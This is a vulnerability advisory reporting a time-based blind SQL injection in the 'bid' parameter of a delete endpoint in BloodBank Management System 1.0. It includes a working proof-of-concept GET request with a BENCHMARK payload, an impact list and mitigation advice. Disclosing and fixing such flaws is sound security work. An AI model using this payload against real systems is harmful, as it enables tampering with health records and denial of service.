[**sqli\_delete\_blood\_blank.md**](#file-sqli_delete_blood_blank-md)

## **Affected Version:**

* **BloodBank Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** SQL Injection (Time-Based Blind)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable Endpoint:**

* `/file/delete.php?bid=6`

## **Vulnerability Description:**

A **time-based SQL Injection vulnerability** was discovered in the **delete request functionality** of the **BloodBank Management System** version 1.0. This vulnerability occurs because the `bid` parameter is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

This attack relies on a **blind SQL injection technique**, where the attacker uses time-based delays (via the **`BENCHMARK` function**) to infer if the injection was successful. If the system delays its response, the attacker knows the SQL query was executed, allowing them to:

* **Tamper with or delete sensitive records** (e.g., blood bank data).
* **Extract data slowly** by chaining multiple queries.
* **Cause Denial of Service (DoS)** by overloading the system with intensive queries.

---

## **Proof of Concept (PoC):**

Below is a **GET** request demonstrating the vulnerability using a **time-based SQL injection payload**:

```
GET /file/delete.php?bid=3'%20AND%204994%3dBENCHMARK(5000000%2cMD5(0x51494778))--%20ntES HTTP/1.1
Host: localhost:8080
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate

Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

```
### **Explanation:**

This payload injects the SQL command:

```
' AND 4994=BENCHMARK(5000000, MD5(0x51494778))-- ntES
```

This causes the backend to execute **5,000,000 MD5 operations**, significantly delaying the response if the query executes correctly. The delay confirms that the system is vulnerable to SQL injection.

---

## **Impact:**

* **Data Integrity Compromise:** Attackers can delete or modify blood bank records.
* **Denial of Service (DoS):** Repeated injections can exhaust system resources, making the application unresponsive.
* **Unauthorized Access:** Attackers can leverage this vulnerability to further explore the database and escalate privileges.

---

## **Mitigation Recommendations:**

1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.
2. **Input Validation:** Validate and sanitize the `bid` parameter to allow only expected values (e.g., numeric IDs).
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.
